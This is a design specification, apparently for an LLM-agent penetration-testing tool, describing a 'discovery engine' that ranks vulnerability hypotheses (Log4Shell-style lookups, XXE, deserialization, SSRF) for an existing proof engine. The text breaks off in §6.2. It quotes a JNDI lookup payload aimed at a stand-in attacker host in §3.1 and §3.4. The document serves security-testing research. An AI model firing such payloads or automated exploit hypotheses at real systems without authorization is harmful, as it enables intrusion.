# Clinkz Discovery Engine — Design Specification

> **Status:** v0 — think-on-paper research architecture. **No code, no schema, no PR.**
> This document exists to be pressure-tested with the owner *before* any
> implementation. Every "shape" sketch below is illustrative of intent, not a
> class to be committed. The open-questions list (§9) is the real point — read
> it last, believe it most.
>
> **Audience:** grounds in [`CLAUDE.md`](../CLAUDE.md) and
> [`docs/architecture.md`](./architecture.md). Read those first; this design
> assumes the v2 pipeline (Recon → concurrent Scan/Research/Exploit → Report),
> the deterministic-steps-with-LLM-checkpoints agent pattern, the
> Orchestrator-mediated message bus, and the two SQLite stores
> (`clinkz.db` per-engagement, `clinkz_knowledge.db` cross-engagement).

---

## 0. TL;DR

Clinkz today is a **discriminator**: the recon/scan/exploit pipeline plus the
19 verification-honest `_test_*` methodologies prove real, exploitable impact
and discard phantoms. Its zero-false-positive property is not a heuristic — it
is a small, hard-won vocabulary of *confirmation primitives* (differential
baseline, reflection-guarded marker, content-we-never-sent, in-band-effect-
matching-a-valid-control, bounded side-effect). That vocabulary is the asset.

What does not exist yet is a **discovery engine**: the thing that decides *what
hypotheses are worth proving in the first place*. Today that decision is a
fixed menu — the planner iterates known vuln classes over discovered endpoints.
Novel/zero-day findings require generating hypotheses the fixed menu never
contains.

This design adds a **discovery engine** — a new set of agents running
alongside recon/scan/exploit — built on one model:

> **Vulnerability = Δ-Capability × Untrusted-Channel-Reachability × Provable-Impact**

The discovery engine produces the first two factors (what a technology *can* do
that the developer didn't constrain, and whether an untrusted channel reaches
it). The **existing proof engine supplies the third factor and remains the
universal gate** — so novel findings inherit zero-FP by construction. Anything
the discovery engine dreams up that cannot be expressed as a falsifiable *proof
obligation* in the existing confirmation vocabulary is, at most, a research
lead — never a reported finding.

```
                          THE DISCOVERY ENGINE (new)                                  THE PROOF ENGINE (exists)
        ┌───────────────────────────────────────────────────────────────┐        ┌───────────────────────────┐
        │                                                                 │        │                           │
 source │  (a) Capability Agent   ── grows ──►  CAPABILITY CATALOG        │        │   Exploit Agent           │
 +      │      (re-scoped Research)             (per-technology, keyed    │        │   19 _test_* methodologies│
 finger │                                        on PRIMITIVE not payload)│        │   + generic obligation    │
 print  │             │ Capability(tech)                                  │        │     runner (frontier)     │
        │             ▼                                                   │        │                           │
        │  (b) Intent Agent  ──► Δ = Capability − Intent  ───────┐        │  jobs  │   confirm-honest, zero-FP │
        │                                                        │        │ ─────► │   emission                │
        │  (c) Reachability Agent ──► channel ⇒ Δ-cap edges  ────┤        │        │        │                  │
        │      (intra-fn / cross-fn / log-sink / x-service)      │        │        │        ▼                  │
        │                                                        ▼        │        │   Finding (existing model)│
        │  (d) Hypothesis Agent ──► (Δ-cap × reaching channel × proof     │        └────────────┬──────────────┘
        │      obligation template) ──► convergent + divergent hypotheses │                     │ confirmed / failed
        └───────────────────────────────────────────────────────────────┘◄────────────────────┘
                                    KB EVOLUTION: proven primitives promoted into the catalog → transfer to future targets
```

The discovery engine is a **producer feeding the existing Exploit dispatch**,
not a replacement pipeline. Its floor is today's behavior (no source → it
degrades to catalog-seeded black-box hypotheses); its ceiling is source-sharp Δ
plus cross-boundary reachability.

---

## 1. The core model

### 1.1 The equation, and why it's a product

```
Vulnerability = Δ-Capability  ×  Untrusted-Channel-Reachability  ×  Provable-Impact
```

- **Capability(technology)** — the *full* set of things a technology/framework
  *can* do, sanctioned or not. Log4j → interpolation that triggers JNDI/LDAP/RMI
  lookups. An XML/PDF parser → external-entity fetch (URL / local file). An ORM →
  a raw-query escape hatch that bypasses parameterization. A server-side fetcher
  → arbitrary egress. A deserializer → gadget-chain code execution.
- **Intent(developer)** — the subset the developer *meant* to use. "I log
  messages." "I parse the uploaded invoice." "I fetch the avatar URL the user
  gave me."
- **Δ = Capability − Intent** — the attack surface. The capabilities that are
  *present and un-constrained* but were never part of the mental model. **The
  purest, most novel vulns live at high Δ**: an untrusted channel nobody modeled
  as untrusted (a log line) reaching a capability nobody remembered was exposed
  (JNDI egress inside string interpolation). That is Log4Shell, stated in the
  model.
- **Untrusted channel** — deliberately broad: user input, a *parsed file*, a
  *service-to-service message*, an *internal ping/health-check*, a *webhook*, a
  *queue/DNS record/HTTP header*, a *log sink* (Log4Shell), or a *request
  sequence* (business logic — checkout quantity, workflow step-skip). Not just
  "the query string."
- **Provable-Impact** — a real, attacker-controlled, observable effect,
  distinguishable from baseline/reflection/coincidence. **This is the existing
  proof engine.**

It is a **product**, not a sum — all three factors must be non-zero:

| Factors present | Result | Who decides |
|---|---|---|
| Δ but no reachable untrusted channel | dead code path, **not exploitable** | Reachability Agent zeroes it |
| Reachable channel, but only to sanctioned capability (Δ=0) | intended behavior, **not a vuln** | Intent Agent zeroes it |
| Δ + reachability, but no provable effect | **hypothesis, not a finding** | Proof engine zeroes it |
| all three non-zero | **confirmed vulnerability** | proof engine emits `Finding` |

The discovery engine's entire job is to *find the (Δ × reachable-channel)
pairs* and *hand each to the proof engine to resolve the third factor*. It never
decides "is this a vuln" — it decides "is this worth the proof budget."

### 1.2 Where each factor is produced

| Factor | Produced by | Store |
|---|---|---|
| Capability(tech) | (a) **Capability Agent** (re-scoped Research) | `clinkz_knowledge.db` catalog (cross-engagement) |
| Intent(dev) → Δ | (b) **Intent Agent** | `clinkz.db` per-engagement Δ-set |
| Untrusted-channel reachability | (c) **Reachability Agent** | `clinkz.db` per-engagement reachability graph |
| (Δ × channel) → falsifiable hypothesis | (d) **Hypothesis Agent** | `clinkz.db` per-engagement hypothesis queue |
| Provable-Impact | **existing Exploit/proof engine** (unchanged gate) | `clinkz.db` `findings` |

### 1.3 Convergent vs divergent hypotheses (threaded throughout)

Two modes of generating (Δ × channel) hypotheses, distinguished by how they're
produced and how much proof budget they justify:

- **Convergent** — *pattern-transfer + chaining*. Take a catalogued primitive
  for a fingerprinted technology and instantiate it against the discovered
  channels (e.g. "Mongo driver present → operator-injection primitive → try it
  on every JSON-body param"), or **chain** two already-confirmed primitives
  (LFI-read + log-write → log-poisoning RCE). High precision, low
  proof-budget-per-hypothesis, mostly maps to *existing* `_test_*` methodologies.
  **This is the tractable first build.**
- **Divergent** — *intent-gap scenario engineering*, "engineer a scenario from a
  tech hint." The Log4Shell move: nobody had a "log a JNDI string" methodology;
  you had to *imagine* that the logging path was an untrusted channel to an
  egress capability. LLM-creative, lower precision, **gated hard** by the proof
  engine + a strict proof obligation. This is the second build, and it depends on
  a generic obligation runner and an out-of-band collaborator (§9).

The safety story is the same for both: **divergent hypotheses are allowed to be
wild precisely because the proof obligation is strict.** Creativity is cheap;
confirmation is the scarce, honest resource.

---

## 2. The four layers as agents

### 2.1 Placement in the Orchestrator

The discovery agents obey every existing rule: Orchestrator-mediated comms (no
agent talks to another directly), deterministic steps with named LLM
checkpoints (no free-form ReAct), tools by capability, scope-enforced I/O. They
slot into the concurrent block:

```
Orchestrator
    │
    ▼
ReconAgent (sequential — fingerprint, tech stack)
    │
    ├── (gray-box input) SOURCE INGESTION  ── produces SourceModel ──┐  (deterministic tool, not an agent)
    │                                                                 │
    ▼                                                                 ▼
┌──────────────────────────────────── concurrent ───────────────────────────────────────┐
│                                                                                          │
│  ScanAgent        Capability Agent      Intent → Reachability → Hypothesis     Exploit  │
│  (channels:       (re-scoped Research:   (the discovery chain; each depends    (proof   │
│   endpoints,       grows the catalog;     on the prior; emits hypotheses        engine, │
│   forms, params)   emits active-primitive continuously)                         the     │
│                    set for the stack)                                           gate)   │
│                                                                                          │
└──────────────────────────────────────────────────────────────────────────────────────┘
         │                    │                          │                         │
   endpoints            capability_primitives      capability_deltas          findings
   (channels)           (KB, cross-engagement)     reachability_edges         (existing model)
                                                    hypotheses (clinkz.db)
    │
    ▼
ReportAgent                 (unchanged — consumes the same Finding rows)
```

The **Capability Agent absorbs the current Research Agent's slot** in the
concurrent block. The **Intent → Reachability → Hypothesis** trio is a
mini-pipeline (each step consumes the previous) that runs concurrently with Scan
and streams hypotheses to Exploit. Exploit's only hard dependency stays Scan
(it needs channels); discovery hypotheses are *folded in as they arrive* exactly
as Research's runbook is folded in today — best-effort, never blocking.

**Design note (agent count).** Conceptually there are four layers, hence four
agents. Intent and Reachability are tightly coupled — both read the same
`SourceModel`, and reachability is meaningless without a Δ target — so a
pragmatic first build MAY co-locate them as one "Surface Agent." This document
keeps them separate for contract clarity and to respect the layer decomposition;
§9 flags the merge as an open call.

### 2.2 Shared substrate: Source Ingestion → `SourceModel`

Not an agent — a deterministic tool (a `ToolBase`-style component, discovered by
capability like every other tool) that both Intent and Reachability consume. In
gray-box mode, the source tree is an **engagement input** alongside the scope.

Ingestion is deliberately *shallow* (no whole-program analysis — see §3). It
produces a `SourceModel`: a per-engagement, queryable projection of the code
that is cheap to build and safe to compute over.

*Conceptual shape (illustrative — not an implementation):*

```
SourceModel
  dependency_manifests : [ (ecosystem, name, version_exact) ]      # package.json, pom.xml, go.mod, requirements.txt, lockfiles
  config_facts         : [ (subject, flag, value, file:line) ]      # e.g. log4j2 formatMsgNoLookups=false; XML secure-processing off; CSP header
  call_sites           : [ (capability_hint, symbol, file:line,     # grep/shallow-AST: logger.info(x), new SAXParser(), orm.raw(), Runtime.exec, eval, pickle.loads
                            arg_taint_hint, guard_nearby?) ]
  entrypoints          : [ (route/handler/consumer, file:line,      # HTTP handlers, queue consumers, webhook receivers, file-parse callbacks
                            input_shape) ]
  wiring               : [ (producer, transport, consumer) ]        # compose files, queue topology, service-mesh config, client SDK calls
  coverage_grade       : FULL | PARTIAL | ABSENT                    # how much of the running system this source explains
```

Safety: ingestion is **regex / bounded-AST only, never `eval`**, bounded in file
count and bytes, and treats source as untrusted data (it may be generated,
vendored, or deliberately misleading). This mirrors the existing discipline in
`_route_discovery.py` (bounded BFS, no `eval`, same-origin, size caps).

### 2.3 (a) Capability Agent — the re-scoped Research Agent

**The re-scope is the biggest conceptual change to an existing agent.** Today
`ResearchAgent` (`agents/research.py`) caches *techniques* and their *success
rates* — it queries the KB, web-searches CVEs, has an LLM synthesize
`Technique` objects (name/description/steps/payload-ish), and persists them as
`playbook_entries` (tier-3). Its output is essentially "here are payloads that
worked before."

The Capability Agent's job is different: **build and grow the per-technology
Capability Catalog** — the *shape/primitive* of what each technology can do,
payload-free, so it transfers to novel targets. It stops thinking in "techniques
that worked" and starts thinking in "capabilities that exist." (The old
technique/success-rate data is not discarded — it is re-cast as *instantiations*
of primitives; see §3 and §6.)

| Contract | Detail |
|---|---|
| **Trigger** | Orchestrator, per engagement, seeded with the Recon tech stack (`ReconResult` technologies) + any framework source; **also runs offline/continuous** to grow the catalog from CVE/CWE/bug-bounty corpora independent of any engagement. |
| **Input** | `technologies: list[str]` (fingerprint), optional framework source refs, live web (native Gemini Search Grounding, as today), NVD/CWE feeds. |
| **Steps** (deterministic + LLM checkpoints) | 1. Query catalog for known primitives of each tech (DETERMINISTIC). 2. Web/CVE/CWE research for *new* capability evidence (TOOL). 3. **LLM checkpoint: abstract each CVE/writeup/source-fact from payload → primitive** (the crown-jewel reasoning step, §3.4). 4. Version-range reconciliation (DETERMINISTIC — a primitive is gated by version). 5. Persist new/updated `CapabilityPrimitive` rows to the catalog. 6. Emit the **active primitive set** for the fingerprinted stack. |
| **Output → KB** | `CapabilityPrimitive` rows in `clinkz_knowledge.db` (new table; §3.2). Cross-engagement, technology-keyed, payload-free. |
| **Output → engagement** | *Active primitive set* — the catalog primitives whose `technology_pattern` matches the fingerprinted stack, at the fingerprinted versions. This is the raw `Capability(tech)` term the Intent Agent subtracts from. |
| **LLM** | Gemini (as Research today), Anthropic fallback. The abstraction checkpoint (step 3) is the one that most wants a strong model; may pin Anthropic for that checkpoint. |
| **Reuses** | `RuntimeResearcher` + grounding; `RESEARCH_TIME_BUDGET`, `GEMINI_MAX_RPM`, bounded-retry discipline; the persistent-KB connection. |

### 2.4 (b) Intent Agent — computes Δ

| Contract | Detail |
|---|---|
| **Trigger** | Orchestrator, after Recon + Source Ingestion; concurrent with Scan. |
| **Input** | `SourceModel`; the fingerprint; the **active primitive set** from the Capability Agent (routed via Orchestrator). |
| **Responsibility** | For each capability primitive present in the stack, decide whether it is **sanctioned** (developer meant it, and constrained it), **gated** (config disables it), or **exposed** (present, un-gated, no evidence of intent/guard). Δ = the exposed set, each with a Δ-confidence. |
| **Steps** | 1. Manifest → the *full* capability set (Capability term, deterministic). 2. Config facts → subtract gated primitives (`formatMsgNoLookups=true`, secure-processing on, ORM safe-mode, strict CSP) (DETERMINISTIC). 3. Call-site facts → classify each remaining primitive: has a call site with a nearby guard (→ lower Δ, "intended + defended"), has an un-guarded call site reachable from an entrypoint (→ high Δ), or has *no call site at all* yet is present in a dep (→ **highest Δ / the intent-gap** — present but nobody wired an intent around it; the Log4Shell shape). 4. **LLM checkpoint:** adjudicate ambiguous call sites (is this guard real or bypassable?) and assign Δ-confidence. |
| **Output → engagement** | `CapabilityDelta` rows (`clinkz.db`): `(primitive_id, present, gated_by?, intent_evidence, delta_grade, delta_confidence)`. |
| **Degradation** | With no source, steps 1–3 fall back to fingerprint→catalog + behavioral inference (§3.5); Δ becomes coarser but never empty. |

### 2.5 (c) Reachability Agent — untrusted channel ⇒ Δ-capability

| Contract | Detail |
|---|---|
| **Trigger** | Orchestrator, after Intent produces Δ; concurrent with Scan (consumes Scan channels as they land). |
| **Input** | `SourceModel`; the Δ-set; the discovered channels — HTTP `Endpoint`s from `StateStore.get_endpoints` (with `ParamLocation`), forms, plus the *broader* channels (parsed-file sinks, queue consumers, webhook receivers, log sinks, header reads) enumerated from `SourceModel.entrypoints`. |
| **Responsibility** | For each Δ-capability, decide whether *any* untrusted channel can reach it, and with what **soundness grade**. Build the reachability graph (§4). |
| **Steps** | 1. Enumerate untrusted channels (HTTP params ∪ file parses ∪ messages ∪ headers ∪ log sinks ∪ sequence-shaped flows). 2. For each Δ-capability sink, walk toward channels: intra-function (grep), intra-service cross-function (bounded call-graph walk), cross-service (wiring + consumer source). 3. Tag each channel→sink path with a soundness grade: `STATIC_CONFIRMED` / `STATIC_HEURISTIC` / `HYPOTHESIZED`. 4. **LLM checkpoint:** for `HYPOTHESIZED` edges (esp. cross-service / sequence), judge plausibility → reachability prior. |
| **Output → engagement** | `ReachabilityEdge` rows (`clinkz.db`): `(channel_ref, primitive_id, path_evidence, soundness_grade, reach_confidence)`. |
| **Non-negotiable** | Reachability is a **prior for recall/prioritization, never a proof** (§4.3). A `HYPOTHESIZED` edge is still emitted downstream; the proof engine is the arbiter of reachability-in-fact. |

### 2.6 (d) Hypothesis Agent — feeds the proof engine

| Contract | Detail |
|---|---|
| **Trigger** | Orchestrator, streaming as reachability edges land; concurrent with Exploit. |
| **Input** | Δ-set × reachability edges × the catalog's `proof_obligation_template` per primitive. |
| **Responsibility** | Turn each (Δ-capability, reaching untrusted channel) pair into a **falsifiable hypothesis carrying a concrete proof obligation** (§6). Do both convergent (instantiate/chain) and divergent (intent-gap scenario) generation. Rank hypotheses by `Δ-grade × reach_confidence × primitive_evidence_grade`. |
| **Steps** | 1. Convergent: for each edge whose primitive has a proof-obligation template, instantiate against the channel. 2. Chaining: compose confirmed primitives into multi-step obligations. 3. Divergent (gated build): LLM proposes intent-gap scenarios from tech hints for high-Δ primitives lacking a template; **discard any that cannot state a falsifiable obligation.** 4. Rank + dedup. |
| **Output → Orchestrator → Exploit** | `Hypothesis` rows mapped to proof-engine jobs: an `ExploitTask` (Tier-A, binds to an existing `_test_*`) or a `ProofObligationTask` (Tier-B, generic runner). These enter the Exploit planner's existing **plan-union** (`_merge_coverage`), so nothing about dispatch changes. |
| **Volume gate** | No falsifiable obligation → the hypothesis is logged as an operator research-lead, **never queued as a finding candidate.** |

### 2.7 The discovery → proof handoff (one seam)

The clean insight: **discovery is a third source of exploit tasks.** Today the
Exploit planner unions two sources in `_merge_coverage`: the LLM plan
(`_llm_plan_exploits`) and deterministic per-endpoint coverage
(`_build_deterministic_plan`). The discovery engine adds a third — the
hypothesis queue — unioned the same way, bounded by `EXPLOIT_MAX_PLAN_TASKS`,
dispatched through the same round-robin fairness (`_step_execute_exploits`), and
deduped through the same chokepoint (`_persist_finding` / `_emitted_finding_keys`).
No parallel dispatch, no parallel report path, no parallel dedup. Findings come
back as the existing `Finding` model, so Report/KB all work unchanged.

---

## 3. The Capability Catalog (the crown jewel)

Spec'd hardest, because this is what makes discovery *transfer* to targets
Clinkz has never seen.

### 3.1 The load-bearing principle: primitive, not payload

A **payload** is target-specific and does not transfer: `${jndi:ldap://attacker/x}`
means nothing on a target that isn't running Log4j, and the exact string is
version/WAF-specific even where it does.

A **capability primitive** is technology-invariant and *does* transfer: *"Log4j
message interpolation resolves lookups, and the lookup resolver can perform an
outbound network fetch (JNDI → LDAP/RMI)."* That sentence is true of every app
using vulnerable Log4j, regardless of which endpoint, which parameter, or which
payload string. The payload is merely the *instantiation* of the primitive
against a specific channel on a specific target.

The catalog stores **primitives**. Worked examples:

| Technology | Capability primitive (payload-free) | Primitive class | Effect (what a proof would observe) |
|---|---|---|---|
| Log4j (vuln range) | interpolation of a request-derived string triggers a lookup resolver with outbound fetch | `EGRESS_FETCH` | out-of-band callback from server to attacker host |
| XML/SOAP/SVG/PDF parser (DTD on) | external entity resolves a URL / local file during parse | `FILE_READ` / `EGRESS_FETCH` | file content we never sent, returned in-band or OOB |
| ORM with raw escape hatch | `.raw()` / string-concatenated query bypasses parameterization | `QUERY_ESCAPE` | boolean/union/error/time DB differential |
| Server-side fetcher | app fetches an attacker-supplied URL | `EGRESS_FETCH` | internal/metadata content reflected, or OOB hit |
| Java/PHP/Python deserializer | untrusted bytes → object graph → gadget code-exec | `DESERIALIZE` | command-output / OOB from a gadget chain |
| Template engine (per engine) | server-side expression eval with object-graph gadget | `CODE_EVAL` | arithmetic eval in-band, then RCE echo-canary |

The last row already exists in Clinkz — the SSTI methodology encodes per-engine
gadgets (Pug/EJS/Jinja2/Freemarker). **The catalog generalizes what SSTI already
does for one class to all classes**: "here is the primitive shape and here is how
you'd prove it fired," keyed by technology, free of any specific payload.

### 3.2 Catalog representation

*Conceptual shape (illustrative — not an implementation):*

```
CapabilityPrimitive                       # new table in clinkz_knowledge.db
  id
  technology_pattern      # regex matcher, exactly like playbook_entries.technology_pattern
  version_range           # SEMVER/PEP440 range the primitive applies to  ← version-gated, load-bearing
  name                    # "message-lookup-interpolation", "external-entity-resolution"
  primitive_class         # taxonomy enum: EGRESS_FETCH | FILE_READ | CODE_EVAL | QUERY_ESCAPE |
                          #                 DESERIALIZE | PATH_TRAVERSAL | AUTH_FORGE | STATE_MUTATION | ...
  trigger_shape           # ABSTRACT description of the input SHAPE that activates it
                          #   e.g. "interpolation sigil ${...} present in any value that reaches a rendered/logged string"
                          #   (NOT a literal payload)
  input_carriers          # channel kinds that can carry the trigger: [header, body_field, filename, log_line, query, path, message]
  effect_class            # observable consequence: outbound_network | file_content_return | expression_eval |
                          #                          rowset_widening | time_delay | privilege_change | ...
  proof_obligation_template   # ← THE TRANSFER KEY (§6): how to prove it fired, in confirmation-primitive terms
  sanctioned_by_default   # is this ON in default config? (informs Intent/Δ)
  gating_config           # config flags that enable/disable it (formatMsgNoLookups, FEATURE_SECURE_PROCESSING, ...)
  cwe_refs / capec_refs
  provenance              # CVE ids / writeup URLs / framework-source commit that established the primitive
  evidence_grade          # how well-established (bootstrapped-from-CVE < confirmed-in-the-wild-by-Clinkz)
```

The two fields that make it a *catalog* and not a payload list: `trigger_shape`
(abstract, not literal) and `proof_obligation_template` (payload-free
confirmation recipe). Everything else is bookkeeping that the existing
`playbook_entries` table already models (note the deliberate symmetry with
`technology_pattern`, `cve_id`, `severity`, `source_url`).

### 3.3 Relationship to the existing KB

The catalog **does not replace** `playbook_entries` / `technique_results` /
`technology_relations` — it sits above them and re-interprets them:

- A `playbook_entries` row (a *technique*) becomes an **instantiation** of a
  primitive against a channel shape: `technique = primitive × input_carrier ×
  concrete proof-obligation instance`. Existing techniques can be back-linked to
  primitives by the abstraction checkpoint (§3.4).
- `technique_results` (success/failure history) generalizes to
  **`primitive_results`** — "when this primitive was Δ-present and reachable, how
  often was it provable" — a prioritization prior, never an emission signal (§6).
- `technology_relations` already models cross-tech similarity; the catalog reads
  it to *transfer a primitive as a lower-confidence hypothesis* to a related
  technology (§6.4). This is the existing cross-tech-transfer idea, lifted from
  the technique level to the primitive level.

### 3.4 Population: CVE/CWE/framework-source → primitive (the abstraction step)

Three ingestion paths grow the catalog, all funneling through one LLM
**abstraction checkpoint** whose only job is: *strip the target-specificity, keep
the primitive.*

1. **CVE / bug-bounty writeup → primitive.** Input: "CVE-2021-44228 —
   `${jndi:ldap://…}` in a User-Agent logged by Log4j 2.x → RCE." Abstraction
   output: primitive `message-lookup-interpolation`, class `EGRESS_FETCH`,
   trigger_shape "interpolation sigil in a request-derived string that reaches a
   log/render sink", version_range "≤2.14.1 (and partials through 2.16)",
   proof_obligation "OOB callback from server". The abstraction *discards* the
   specific payload and the specific header — those are instantiation details.
2. **CWE → primitive skeleton.** CWE gives the *class* shape (CWE-611 external
   entity, CWE-502 deserialization). Useful as a prior/skeleton to be filled by
   CVE/source evidence; low evidence_grade until corroborated.
3. **Framework source → primitive (offline, high-value).** Reading a library's
   own source reveals capabilities *before any CVE exists* — the divergent
   frontier. "This XML parser calls `EntityResolver` unless
   `FEATURE_SECURE_PROCESSING` is set" is a primitive derived directly from
   code, with its own gating_config. This is where *novel* (pre-CVE) capabilities
   enter the catalog.

Risk (see §9): the abstraction step is an unsolved LLM reliability problem. A
mis-abstracted primitive pollutes the catalog. **Mitigation is structural, not
perfect:** primitives never emit findings — they only generate hypotheses that
the proof engine gates. A bad primitive costs *budget*, not *correctness*.

### 3.5 Degradation of Capability when source/fingerprint is coarse

- **Exact manifest** (best): `log4j-core:2.14.1` → exact primitive set at exact
  version. Sharpest possible Capability term.
- **Fingerprint only** (no source): "Java + something that looks like Log4j" →
  the primitive set for the tech family, version unknown → **wider** Capability
  (assume vulnerable until the proof engine says otherwise). Coarser, never
  empty.
- **No fingerprint match**: no catalogued primitives → the discovery engine
  contributes nothing for that tech and the pipeline runs exactly as today. The
  floor is current behavior.

---

## 4. Cross-boundary reachability (the acknowledged hard core)

### 4.1 The reachability graph

Reachability is a directed graph:

- **Nodes** = untrusted-channel sources ∪ Δ-capability sinks ∪ intermediate
  functions/services/queues.
- **Edges** = "attacker-influenced data can flow from A to B."
- **A hypothesis** = a path from an untrusted-channel node to a Δ-capability
  node.

Untrusted-channel sources are broad (per §1.1): HTTP params/headers/cookies,
parsed-file contents, queue/webhook messages, DNS/log lines, and *request
sequences* (a business-logic "channel" is a state transition across multiple
requests, not a byte flow).

### 4.2 Soundness grades

Every edge carries a grade, because we will *never* have sound whole-program
analysis in a gray-box web app spanning services:

| Grade | Meaning | How derived |
|---|---|---|
| `STATIC_CONFIRMED` | source shows the channel value reaching the sink | intra-function grep / short bounded call chain in available source |
| `STATIC_HEURISTIC` | plausible path within a bounded call-graph walk, not proven | depth-bounded symbol walk (LLM-assisted), same discipline as `_route_discovery` BFS |
| `HYPOTHESIZED` | no static path (missing source, cross-service, or sequence) but plausible by shape | LLM plausibility judgement over wiring/behavior |

### 4.3 Reachability is a *prior* — which relocates the hard problem onto proof budget

The original central bet was: we don't need sound reachability to preserve zero-FP,
because the proof engine is the arbiter no matter how a hypothesis was generated —
so reachability only has to *rank*. That is half right, and **the false half is the
dangerous one.**

**The true half.** Treating a `HYPOTHESIZED` edge as a prior removes all
false-*positive* risk. An over-eager reachability guess can never become a wrong
finding — the proof engine zeroes it. And a confirmed effect *is* the reachability
proof, retired into the graph as `STATIC_CONFIRMED` for next time (§6, §7). We let
the world resolve what the static analysis couldn't.

**The false half.** "It only has to rank" quietly moves the whole difficulty off
*soundness* and onto *proof budget* — which **nothing in this design sizes.** A weak
prior doesn't produce wrong findings; it produces **too many candidates**, and the
proof engine (which is not free) never reaches the real one before the engagement
ends. Zero-FP is preserved and the vuln is still missed. The failure mode has moved
from *false positive* to **false negative under budget exhaustion** — harder to
notice, because nothing looks broken.

So the real research bet is **not** *"is reachability sound"* but:

> **Can the reachability prior be good enough that the real vuln lands in the
> top-N candidates the proof budget can actually afford to test?**

The rest of this section is about that N. It is **not solved here — it is named**,
and it is §9's risk #1.

#### 4.3.1 Proof-budget economics (first-class, unsized, make-or-break)

- **What a job costs — heterogeneously.** One proof-engine job is *not* one HTTP
  request. A **Tier-A** job (bind to a `_test_*`) is a bounded burst of probes
  (baseline + differential + verify) — cheap, seconds. A **Tier-B** job (generic
  obligation runner) adds an LLM planning call to instantiate the obligation. A
  **P6/OOB** job adds a *wall-clock wait* for a callback that may never arrive — the
  most expensive unit, because it spends *time*, not requests. Budget must be
  counted in these mixed units, never in "number of hypotheses."
- **What an engagement can afford.** Today the exploit phase has *no* wall-clock
  deadline (`EXPLOIT_PHASE_BUDGET=0`; operation-level timeouts are the only valve,
  CLAUDE.md). With a fixed menu of methodologies that is safe. The moment discovery
  becomes a **third, unbounded task source**, "no phase deadline" flips from a safety
  property into a liability — the queue can grow faster than it drains. Budget has to
  become an explicit, *counted* resource the day discovery ships.
- **How the prior spends it.** Rank by `Δ-grade × reach_confidence ×
  primitive_evidence_grade` (§6.4), dispatch highest-value-first, so the top-N the
  budget affords are the likeliest true. Same discipline the codebase already lives
  by: the ranking decides *order and spend*, the live proof decides *emission* —
  never the reverse.
- **Fallback when the budget is spent.** Remaining hypotheses are **not silently
  dropped** — they demote to *ranked operator research-leads* (the same channel as
  no-obligation hypotheses, §6.4), so the report says "these N (Δ × channel) pairs
  were generated but not proof-tested, for budget, in this order." A vuln *generated
  but unaffordable* is a recoverable operator decision; a vuln *never generated* is
  not. The budget edge must be **legible, not a truncation.**
- **Starvation guard: don't let a weak prior eat the budget.** The dangerous case is
  a low-precision, high-volume prior (cross-service / business-logic, §4.4) emitting
  a flood at uniform low confidence that consumes the budget before one
  high-confidence convergent hypothesis (the GeoServer-class intra-function SSRF,
  §10) is ever tested. Three guards, none yet built: **(1) partition budget by prior
  class** — `STATIC_CONFIRMED`/convergent gets a *reserved share* the
  `HYPOTHESIZED`/divergent flood cannot touch (a budget-level analogue of the exploit
  round-robin's per-category fairness); **(2) cap per-class candidate volume** before
  ranking, so an unbounded cross-service generator cannot enqueue past its share;
  **(3) a minimum `reach_confidence` floor** to consume *paid* budget at all — below
  the floor a hypothesis goes straight to research-lead, never to a job. Sizing the
  reserved shares, the caps, and the floor is **open-question #1.**

### 4.4 Tractable now vs frontier

| Channel → sink shape | Status | Notes |
|---|---|---|
| Intra-function (param → sink, same handler) | **now** | grep the handler; this is ~what today's planner does, now Δ-directed |
| Intra-service cross-function | **now (heuristic)** | bounded call-graph walk, `STATIC_HEURISTIC`; not sound, good recall |
| **Log-sink channel (Log4Shell class)** | **now, high value** | grep logging calls taking request-derived data — *a channel most scanners never model as untrusted*. Flagship. |
| Stored / second-order (write here, observe there) | **now** | generalize the existing stored-XSS read-back pairing to "write-channel × later-sink" |
| Parsed-file channel (upload → parser Δ-cap) | **now** | file *is* the payload (existing XXE-via-upload shape generalizes) |
| Cross-service (A → queue/HTTP → B's Δ-cap) | **frontier** | tractable only with both services' source + wiring; else `HYPOTHESIZED`, proof-arbitrated. **The hardest bet (§9).** |
| Request-sequence / business-logic | **frontier** | reachability is a *state-machine* property, not a code path; first build = templated patterns (TOCTOU, quantity/price tampering, workflow step-skip) proven by differential outcome; inferring the state machine is unsolved |

---

## 5. (reserved — merged into §6)

*Proof-engine integration is spec'd as its own section below; the numbering is
kept aligned with the brief's seven required topics: §1 model, §2 layers/agents,
§3 catalog, §4 reachability, §6 proof integration, §7 KB evolution, §9 open
questions.*

---

## 6. Proof-engine integration — how novelty inherits zero-FP

### 6.1 The confirmation-primitive vocabulary (what already guarantees zero-FP)

The proof engine's zero-FP property reduces to a *small, closed vocabulary* of
confirmation primitives already implemented across the 19 methodologies. Naming
them precisely is what lets novel hypotheses inherit the guarantee:

| # | Confirmation primitive | Where it lives today |
|---|---|---|
| P1 | **Differential baseline** — probe must diverge from a benign baseline in status/length/normalised-fingerprint | IDOR divergence gate; SQLi boolean true/false; SSTI baseline-anchored eval |
| P2 | **Reflection-guarded marker** — a marker that cannot be explained by input reflection (rejected in 4xx/5xx error bodies, in payload-echo, or after scaffold-strip) | CMDi echo-canary in command-output position; SQLi `_marker_only_in_payload_echo`; SSTI scaffold strip |
| P3 | **Content we never sent** — real file/data content proving disclosure, not a reflected payload | LFI `_LFI_FILE_SIGNATURES`; XXE `_XXE_FILE_CONTENT_SIGNATURES` |
| P4 | **In-band effect matching a valid control** — forged input accepted exactly as a valid baseline while a broken control is rejected | JWT forged-token acceptance vs broken-sig reject; SSRF metadata signature the URL never contained |
| P5 | **Bounded measurable side-effect** — time delta or count widening within safe bounds | NoSQL `$where` sleep; NoSQL modified-count widening; XXE bounded expansion |
| P6 | **Out-of-band callback** — server reaches an attacker-controlled collaborator | **NOT built** — deferred everywhere (CMDi `BLIND_OOB`, XXE `oob_exfil`, SSRF blind). §9. |

**A hypothesis inherits zero-FP if and only if its proof obligation reduces to
one of P1–P6.** That is the whole game — and it is also the **product boundary**:
the discoverable-vuln universe is *exactly* the set of capability classes whose
proof obligation reduces to a confirmation primitive Clinkz has built. Obligations
that do not reduce to P1–P6 are **not emitted** (emitting one anyway is precisely
how zero-FP breaks). The roadmap (§8) is therefore organized around *growing the
primitive set* — you expand what you can **discover** by expanding what you can
**prove** — and the P6 row above, the one unbuilt primitive, is the gate on the
entire blind-egress half of that universe (§8.1).

### 6.2 The Proof Obligation abstraction

A **Proof Obligation** is the falsifiable contract a hypothesis must carry:

```
ProofObligation                      # conceptual — the payload-free confirmation recipe
  setup         # preconditions + how to capture the benign baseline
  trigger       # the attacker-controlled input, placed on the named untrusted channel
